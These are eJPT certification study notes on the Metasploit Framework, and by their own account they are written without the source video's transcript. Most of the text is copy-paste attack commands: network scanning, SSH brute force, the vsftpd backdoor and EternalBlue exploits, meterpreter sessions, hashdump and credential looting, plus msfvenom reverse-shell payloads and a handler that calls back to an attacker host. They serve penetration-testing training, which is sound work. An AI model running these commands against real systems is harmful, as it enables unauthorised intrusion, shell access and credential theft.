# The Metasploit Framework (MSF) — eJPT Study Notes

Note: No transcript was provided for “01 - The Metasploit Framework (MSF).mp4”. The notes below are a conservative, eJPT-aligned summary of what this video typically covers in an Exploitation Frameworks module.

## What the video covers (Introduction / big picture)
- What MSF is: an exploitation framework with modules for scanning, exploitation, payloads, and post-exploitation.
- MSF architecture: modules (auxiliary, exploit, post), payloads, encoders, nops.
- Working with msfconsole, the built-in database, and workspaces.
- Typical workflow: scan/import results → enumerate with auxiliary modules → select exploit → set options/payload → run → manage sessions → post-exploitation.
- Quick intro to msfvenom for payload generation and multi/handler for catching reverse shells.

## Flow (ordered)
1. Start database services and initialize MSF.
2. Launch msfconsole and set up a workspace.
3. Import or run scans (db_nmap or import Nmap XML), view hosts/services.
4. Enumerate using auxiliary scanners (e.g., SMB, SSH, HTTP).
5. Search modules and select an exploit; read module info and options.
6. Set RHOSTS/LHOST and choose a compatible payload.
7. Run the exploit; manage sessions (background, interact, upgrade).
8. Post-exploitation basics (privilege escalation helpers, loot/creds).
9. Handle logging and resource scripts for repeatability.
10. msfvenom for payloads and exploit/multi/handler for listeners.
11. Cleanup and save state.

## Tools highlighted
- msfconsole (Metasploit Framework CLI)
- msfdb (database init/management)
- msfvenom (payload generation)
- Nmap integration: db_nmap or db_import
- Common module families:
  - auxiliary/scanner/*
  - exploit/*
  - post/*
  - exploit/multi/handler

## Typical command walkthrough (detailed, copy-paste friendly)

### 1) Start services and open msfconsole
```bash
# Start PostgreSQL (Kali)
sudo systemctl enable --now postgresql

# Initialize MSF database (first time)
msfdb init

# Launch Metasploit
msfconsole
```

Inside msfconsole:
```text
# Verify DB connection
db_status

# Create/select a workspace
workspace -a eJPT-lab
workspace eJPT-lab

# Optional: log everything to a file
spool /tmp/msfconsole.log
```

### 2) Import or run scans into the MSF DB
Option A: Run Nmap from MSF:
```text
# Fast, service/version scan across a subnet (adjust as needed)
db_nmap -sV -O -p- 10.10.10.0/24
```

Option B: Run Nmap externally and import:
```bash
nmap -sV -O -p- -oA scan 10.10.10.0/24
msfconsole  # if not already open
```
Inside msfconsole:
```text
db_import scan.xml   # Or scan.gnmap/scan.nmap as needed

# Review targets and services
hosts
services
vulns
```

### 3) Enumerate with auxiliary modules (examples)
```text
# SMB version detection
search type:auxiliary smb_version
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

# Enumerate SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run

# SSH brute (use carefully in labs)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.7
set USER_FILE users.txt
set PASS_FILE passwords.txt
set VERBOSE true
run
```

### 4) Find and select exploits
```text
# Filter by service/version
search type:exploit name:vsftpd

# Show details (rank, check support, references)
use exploit/unix/ftp/vsftpd_234_backdoor
info
show options
```

### 5) Set options and payloads
Global helpers (optional):
```text
# Set defaults for the session
setg LHOST 10.10.1.50
setg THREADS 16
```

Example A: Exploit vsftpd 2.3.4 (Metasploitable-like)
```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.5
show options
check           # if module supports it
run             # or: exploit
```

Example B: EternalBlue (Windows MS17-010)
```text
search type:exploit ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show targets
set RHOSTS 10.10.10.7
set RPORT 445
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.1.50
check
run
```

### 6) Session management and Meterpreter basics
```text
# List sessions
sessions

# Interact with a session
sessions -i 1

# In a Meterpreter session:
getuid
sysinfo
ipconfig           # works cross-platform in meterpreter
pwd
ls

# Get a system shell from meterpreter and return
shell
whoami
exit

# Background meterpreter
background

# Upgrade a plain shell to meterpreter (if possible)
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### 7) Post-exploitation quick wins
```text
# Suggest local privilege escalation (Linux/Windows)
use post/multi/recon/local_exploit_suggester
set SESSION 2
run

# Windows: try privilege escalation
sessions -i 2
getsystem           # may or may not work
hashdump            # requires appropriate privileges
background

# Collect credentials and loot
creds
loot
notes -a "Host 10.10.10.7: Admin creds reused from SMB"
```

### 8) Jobs, logging, and cleanup
```text
# Run an exploit as a background job and don't auto-interact
exploit -j -z

# List/kill jobs
jobs -l
jobs -k <job_id>

# Stop logging
spool off

# Save current settings to a resource file (for repeatability)
makerc /tmp/msf.rc

# Exit cleanly
exit -y
```

### 9) msfvenom payloads and multi/handler
Generate payloads:
```bash
# Windows x64 meterpreter reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.50 LPORT=4444 -f exe -o shell.exe

# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.1.50 LPORT=4444 -f elf -o shell.elf

# Bash one-liner payload (raw)
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.1.50 LPORT=4444 -f raw -o rev.sh
```

Catch shells with multi/handler:
```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.1.50
set LPORT 4444
set ExitOnSession false
run -j
```

Note: Encoders (e.g., -e x86/shikata_ga_nai) rarely bypass modern AV/EDR; rely on OPSEC and proper delivery where allowed in labs.

## Practical tips
- Use info and check before running; prefer exploits with rank Excellent/Great.
- Set setg LHOST and THREADS early to reduce repetitive typing.
- Import Nmap results if db_nmap is not available; use db_import.
- Use run/exploit -j -z to keep your console free while the job runs.
- After exploitation, background quickly and record evidence: creds, loot, notes.
- Use workspaces per target/network to keep data organized.
- If a module fails, read last error, show advanced options, try a different payload/target.
- Meterpreter is powerful but noisy; in exams/labs it’s fine—still try to pick stable payloads.
- Keep handlers running persistently with ExitOnSession false when delivering multiple payloads.

## Minimal cheat sheet (one-screen flow)
```text
# Start and open MSF
sudo systemctl enable --now postgresql
msfdb init
msfconsole

# Workspace + logging
workspace -a eJPT
spool /tmp/msf.log
db_status

# Scan/import
db_nmap -sV -O -p- 10.10.10.0/24
# or: db_import scan.xml
hosts
services

# Enumerate
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

# Find exploit
search type:exploit name:vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.5
check
run

# Sessions
sessions
sessions -i 1
getuid; sysinfo; background

# Post
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
creds; loot

# msfvenom + handler (example)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.1.50
set LPORT 4444
set ExitOnSession false
run -j
# generate: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.50 LPORT=4444 -f exe -o shell.exe

# Cleanup
spool off
exit -y
```

## Summary
- Metasploit streamlines the exploit workflow: scan/import → enumerate → exploit → session → post.
- Know core commands: search, use, info, show options, set, run/exploit, sessions, background.
- Leverage auxiliary scanners for fast service validation; use info/check to reduce blind exploitation.
- Manage sessions effectively; upgrade shells and run post modules for quick wins.
- Use msfvenom and exploit/multi/handler to deliver and receive custom payloads.
- Keep data organized via workspaces and the database; log your work and save rc files for reproducibility.